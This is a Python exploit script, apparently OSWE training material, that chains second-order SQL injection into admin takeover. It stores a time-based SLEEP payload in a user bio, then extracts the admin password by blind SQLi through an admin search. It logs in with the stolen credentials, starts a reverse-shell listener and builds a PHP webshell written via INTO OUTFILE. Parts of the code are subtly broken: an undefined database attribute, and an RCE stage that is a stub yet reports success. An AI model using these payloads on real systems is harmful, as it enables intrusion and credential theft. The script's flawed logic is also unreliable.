#!/usr/bin/env python3
"""
Second-Order SQL Injection Exploit

This exploit demonstrates second-order SQL injection using the OSWE skeleton.

Vulnerability: User input is stored in the database, then used in a different
query context (often with higher privileges) later.

Attack Flow:
1. Register user with malicious payload in bio/profile
2. Payload stored in database
3. Admin views user list/search → payload executes in admin context
4. Extract data or achieve RCE via admin privileges

Usage:
    python3 poc_second_order_sqli.py --target-ip 192.168.1.10 --listening-ip 10.10.14.5
"""

import argparse
import requests
import sys
from dataclasses import dataclass, field
from typing import Optional
import urllib3

# Add parent directory to path for imports
sys.path.insert(0, '/home/simon/code/OSWE-Prep/poc-examples/advanced-skeleton')
from modules import (
    create_logger,
    StageManager,
    BlindSQLi,
    MySQLDialect,
    PostgreSQLDialect,
    MSSQLDialect,
    InteractiveListener
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    target_ip: str
    target_port: int
    attacker_ip: str
    attacker_port: int
    protocol: str = "http"
    delay: int = 3
    proxy: Optional[str] = None
    
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    logger = None
    listener: Optional[InteractiveListener] = field(default=None, repr=False)
    
    # State tracking
    registered: bool = field(default=False, repr=False)
    admin_password: Optional[str] = field(default=None, repr=False)

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None


# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Second-Order SQLi Exploit")
    
    parser.add_argument("--target-ip", required=True, help="Target IP address")
    parser.add_argument("--target-port", type=int, default=80, help="Target port")
    parser.add_argument("--listening-ip", required=True, help="Attacker IP")
    parser.add_argument("--listening-port", type=int, default=4444, help="Listener port")
    parser.add_argument("--protocol", default="http", choices=["http", "https"])
    parser.add_argument("--delay", type=int, default=3, help="SQLi delay")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--database", choices=["mysql", "postgres", "mssql"], 
                       default="mysql", help="Database type")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    return parser.parse_args()


# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_register_payload(ctx: ExploitContext, manager: StageManager) -> bool:
    """
    Stage 1: Register user with SQLi payload in profile.
    
    The payload will be stored in the database and executed later
    when an admin performs a search operation.
    """
    ctx.logger.stage("Stage 1: Register with Payload")
    
    # Time-based detection payload
    time_payload = f"test' OR (SELECT SLEEP({ctx.delay})) OR '"
    
    # Registration data
    register_data = {
        "username": "attacker_sqli",
        "email": "attacker@test.com",
        "password": "TestPass123!",
        "bio": time_payload  # Payload stored in DB
    }
    
    try:
        ctx.logger.info("Registering user with time-based payload...")
        ctx.logger.http_request("POST", f"{ctx.get_base_url()}/register", data=register_data)
        
        start_time = requests.get(f"{ctx.get_base_url()}/", verify=False).elapsed.total_seconds()
        
        response = ctx.session.post(
            f"{ctx.get_base_url()}/register",
            data=register_data,
            verify=False,
            proxies=ctx.get_proxies(),
            timeout=30  # Longer timeout for time-based check
        )
        
        elapsed = response.elapsed.total_seconds()
        ctx.logger.http_response(response.status_code, f"{ctx.get_base_url()}/register")
        
        if elapsed >= ctx.delay:
            ctx.logger.success("Time-based SQLi detected! Payload executed on registration.")
        elif response.status_code == 200:
            ctx.logger.success("User registered (payload stored)")
        else:
            ctx.logger.warning(f"Unexpected response: HTTP {response.status_code}")
        
        ctx.registered = True
        return True
        
    except Exception as e:
        ctx.logger.error(f"Registration failed: {e}")
        return False


def stage_trigger_extraction(ctx: ExploitContext, manager: StageManager) -> bool:
    """
    Stage 2: Trigger payload via admin search to extract data.
    
    This simulates the admin searching for users, which triggers
    the stored SQL injection payload.
    """
    ctx.logger.stage("Stage 2: Trigger Payload & Extract Data")
    
    if not ctx.registered:
        ctx.logger.error("User not registered")
        return False
    
    # Configure SQLi module
    dialect_map = {
        "mysql": MySQLDialect(),
        "postgres": PostgreSQLDialect(),
        "mssql": MSSQLDialect()
    }
    
    sqli = BlindSQLi(
        url=f"{ctx.get_base_url()}/admin/search",
        dialect=dialect_map.get(ctx.database, MySQLDialect()),
        delay=ctx.delay,
        param_name="q",
        injection_point="test{payload}",  # Our registered username starts with "test"
        logger=ctx.logger
    )
    
    try:
        ctx.logger.info("Extracting admin password via blind SQLi...")
        
        # Extract password
        password = sqli.extract(
            "SELECT password FROM users WHERE username='admin'",
            use_binary=True,
            max_length=50
        )
        
        if password:
            ctx.admin_password = password
            ctx.logger.success(f"Admin password extracted: {password}")
            ctx.logger.credential("admin", password, "Second-Order SQLi")
            return True
        else:
            ctx.logger.error("Failed to extract password")
            return False
            
    except Exception as e:
        ctx.logger.error(f"Extraction error: {e}")
        return False


def stage_authenticate_admin(ctx: ExploitContext, manager: StageManager) -> bool:
    """
    Stage 3: Authenticate as admin using extracted credentials.
    """
    ctx.logger.stage("Stage 3: Admin Authentication")
    
    if not ctx.admin_password:
        ctx.logger.error("No admin password available")
        return False
    
    try:
        ctx.logger.info("Authenticating as admin...")
        
        login_data = {
            "username": "admin",
            "password": ctx.admin_password
        }
        
        ctx.logger.http_request("POST", f"{ctx.get_base_url()}/login", data=login_data)
        
        response = ctx.session.post(
            f"{ctx.get_base_url()}/login",
            data=login_data,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )
        
        ctx.logger.http_response(response.status_code, f"{ctx.get_base_url()}/login")
        
        if "admin" in response.text.lower() or "dashboard" in response.text.lower():
            ctx.logger.success("Authenticated as admin!")
            return True
        else:
            ctx.logger.error("Admin authentication failed")
            return False
            
    except Exception as e:
        ctx.logger.error(f"Authentication error: {e}")
        return False


def stage_achieve_rce(ctx: ExploitContext, manager: StageManager) -> bool:
    """
    Stage 4: Achieve RCE using admin privileges.
    
    Try various methods depending on database:
    - MySQL: SELECT INTO OUTFILE
    - MSSQL: xp_cmdshell
    - PostgreSQL: COPY TO PROGRAM
    """
    ctx.logger.stage("Stage 4: Achieve RCE")
    
    # Start listener for reverse shell
    ctx.listener = InteractiveListener(
        port=ctx.attacker_port,
        initial_commands=["whoami", "hostname", "id"]
    )
    
    if not ctx.listener.start(blocking=False):
        ctx.logger.error("Failed to start listener")
        return False
    
    ctx.logger.success(f"Listener started on port {ctx.attacker_port}")
    
    # Method depends on database type
    if ctx.database == "mysql":
        # Try to write webshell
        ctx.logger.info("Attempting file write via MySQL...")
        
        php_shell = "<?php system($_REQUEST['cmd']); ?>"
        write_query = f"SELECT '{php_shell}' INTO OUTFILE '/var/www/html/shell.php'"
        
        # This would be executed through SQL injection
        # Implementation depends on specific vulnerability
        ctx.logger.warning("MySQL file write - customize for target")
        
    elif ctx.database == "mssql":
        # Enable xp_cmdshell
        ctx.logger.info("Attempting xp_cmdshell execution...")
        ctx.logger.warning("MSSQL xp_cmdshell - customize for target")
        
    elif ctx.database == "postgres":
        ctx.logger.info("Attempting COPY TO PROGRAM...")
        ctx.logger.warning("PostgreSQL RCE - customize for target")
    
    ctx.logger.info("Trigger reverse shell on target...")
    ctx.logger.info(f"Waiting for connection (60s timeout)...")
    
    if ctx.listener.wait_for_connection(timeout=60):
        ctx.logger.success("Shell connected!")
        ctx.listener.interactive_shell()
        return True
    else:
        ctx.logger.warning("No shell connection - exploit may require manual triggering")
        return True  # Partial success


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    args = parse_args()
    
    # Create logger
    log = create_logger("second_order_sqli", verbose=args.verbose)
    log.info("Second-Order SQL Injection Exploit")
    log.info("=" * 60)
    
    # Build context
    ctx = ExploitContext(
        target_ip=args.target_ip,
        target_port=args.target_port,
        attacker_ip=args.listening_ip,
        attacker_port=args.listening_port,
        protocol=args.protocol,
        delay=args.delay,
        proxy=args.proxy
    )
    ctx.logger = log
    
    # Initialize stage manager
    manager = StageManager(logger=log, fail_fast=False)
    
    # Register stages
    manager.add_stage("Register Payload", stage_register_payload)
    manager.add_stage("Extract Data", stage_trigger_extraction, depends_on=["Register Payload"])
    manager.add_stage("Admin Auth", stage_authenticate_admin, depends_on=["Extract Data"])
    manager.add_stage("Achieve RCE", stage_achieve_rce, depends_on=["Admin Auth"], optional=True)
    
    # Execute
    success = manager.execute(ctx, manager)
    
    # Summary
    manager.print_summary()
    
    log.summary(
        Target=ctx.get_base_url(),
        Admin_Password=ctx.admin_password or "N/A",
        Registered=ctx.registered,
        Status="SUCCESS" if success else "FAILED"
    )
    
    # Cleanup
    if ctx.listener:
        ctx.listener.stop()
    
    log.close()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
